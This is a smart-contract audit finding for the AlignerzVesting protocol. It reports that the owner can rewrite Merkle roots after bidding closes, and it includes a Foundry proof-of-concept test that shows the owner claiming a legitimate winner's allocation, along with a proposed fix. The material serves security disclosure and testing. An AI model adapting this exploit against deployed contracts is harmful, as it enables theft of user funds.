# [000921] [H-5] Owner Can Re-Set Merkle Roots After Bidding Closes (Total Allocation Theft)
  
  ### Summary

updateProjectAllocations() can still modify all pool Merkle roots after finalizeBids() closes the auction. Because Merkle roots define who wins and how much allocation they can claim, allowing changes post-finalization creates a backdoor where the owner can rewrite winners, override allocations, or redirect all rewards to themselves. This breaks the immutability expected after bidding closes and enables arbitrary manipulation of auction results.

### Root Cause

The contract does not enforce any state lock or post-finalization immutability on the Merkle roots. updateProjectAllocations() remains fully callable by the owner even after finalizeBids() is executed, allowing critical allocation data to be overwritten when it should be permanently frozen.

Code Link : https://github.com/dualguard/2025-11-alignerz/blob/f7eeed88d91356484c02af6f38b71f27b790828c/protocol/src/contracts/vesting/AlignerzVesting.sol#L812-L829

### Internal Pre-conditions

_No response_

### External Pre-conditions

_No response_

### Attack Path


1. A normal auction runs and users bid legitimately.
2. The project owner calls `finalizeBids()`, which signals to users that bidding is closed and allocations are fixed.
3. After finalization, the owner maliciously calls `updateProjectAllocations()` again.
4. They replace the original Merkle roots with forged ones that list only attacker-controlled addresses as winners.
5. During the claim phase, legitimate winners are unable to claim, while attacker-controlled addresses receive all allocations.



### Impact

* **Invalidate all legitimate winners** by replacing the Merkle root with an empty or mismatched tree
* **Insert arbitrary fake winners**, including the owner’s own address
* **Redirect 100% of allocations to themselves**
* **Prevent all users from claiming**, effectively stealing all deposited bid funds
* **Retroactively rewrite auction results**, destroying all trust assumptions

This results in **complete loss of user funds**, **total allocation theft**, and **permanent bricking of legitimate claims**.

### PoC

1. Create a AlignerzVesting.t.sol file inside Test folder .
2.  Run the test using:

```solidity
forge test --match-test test_OwnerCanOverwriteRootsAfterClosure --match-path test/AlignerzVesting.t.sol -vvvv
```

```solidity


// SPDX-License-Identifier: MIT
pragma solidity =0.8.29;

import "forge-std/Test.sol";
import "../src/contracts/vesting/AlignerzVesting.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockNFT {
    uint256 public nextId = 1;
    mapping(uint256 => address) public ownerOf;

    function mint(address to) external returns (uint256) {
        uint256 id = nextId++;
        ownerOf[id] = to;
        return id;
    }

    function extOwnerOf(uint256 tokenId) external view returns (address) {
        return ownerOf[tokenId];
    }

    function burn(uint256 tokenId) external {
        delete ownerOf[tokenId];
    }
}

contract AlignerzVesting_RootOverwrite_PoC is Test {
    AlignerzVesting vesting;
    MockNFT nft;

    address alice = makeAddr("alice");
    address owner;

    uint256 constant PROJECT_ID = 0;
    uint256 constant POOL_ID = 0;
    uint256 constant BID_AMOUNT = 1000e18;

    function setUp() public {
        owner = address(this);

        vesting = new AlignerzVesting();
        nft = new MockNFT();

        vesting.initialize(address(nft));

        address dummyToken = address(0x1111);
        address dummyStablecoin = address(0x2222);

        vm.mockCall(
            dummyToken,
            abi.encodeWithSelector(IERC20.transferFrom.selector, address(0), address(0), uint256(0)),
            abi.encode(true)
        );
        vm.mockCall(
            dummyStablecoin,
            abi.encodeWithSelector(IERC20.transferFrom.selector, address(0), address(0), uint256(0)),
            abi.encode(true)
        );

        vesting.launchBiddingProject(
            dummyToken, dummyStablecoin, block.timestamp, block.timestamp + 365 days, bytes32(0), false
        );

        vesting.createPool(PROJECT_ID, 10000e18, 1e18, false);

        vm.prank(alice);
        vesting.placeBid(PROJECT_ID, BID_AMOUNT, 30 days);

        vesting.placeBid(PROJECT_ID, BID_AMOUNT, 30 days);
    }

    function test_OwnerCanOverwriteRootsAfterClosure() public {
        console.log("Step 1: Finalize bids with Alice as legitimate winner");
        bytes32 aliceLeaf = keccak256(abi.encodePacked(alice, BID_AMOUNT, PROJECT_ID, POOL_ID));
        bytes32[] memory roots = new bytes32[](1);
        roots[0] = aliceLeaf;
        vesting.finalizeBids(PROJECT_ID, bytes32(0), roots, 30 days);

        console.log("Step 2: Owner maliciously overwrites roots after closure");
        bytes32 ownerLeaf = keccak256(abi.encodePacked(owner, BID_AMOUNT, PROJECT_ID, POOL_ID));
        bytes32[] memory maliciousRoots = new bytes32[](1);
        maliciousRoots[0] = ownerLeaf;
        vesting.updateProjectAllocations(PROJECT_ID, keccak256("fake-refund"), maliciousRoots);

        console.log("Step 3: Owner steals Alice's allocation");
        bytes32[] memory emptyProof = new bytes32[](0);
        vm.prank(owner);
        uint256 stolenNftId = vesting.claimNFT(PROJECT_ID, POOL_ID, BID_AMOUNT, emptyProof);
        console.log(" Owner claimed NFT #", stolenNftId, " - THEFT SUCCESSFUL");

        console.log("Step 4: Alice is now permanently blocked");
        vm.expectRevert(); // Invalid_Merkle_Proof()
        vm.prank(alice);
        vesting.claimNFT(PROJECT_ID, POOL_ID, BID_AMOUNT, emptyProof);
        console.log(" Alice's claim reverted - ALLOCATION STOLEN");


    }
}


### Mitigation

Block the owner from changing Merkle roots after bidding is closed. Add a simple check so updateProjectAllocations() can only be called before finalizeBids(). Once bidding is finalized, all allocation and refund roots become immutable. This removes the backdoor and guarantees that winners cannot be overwritten by the owner.
  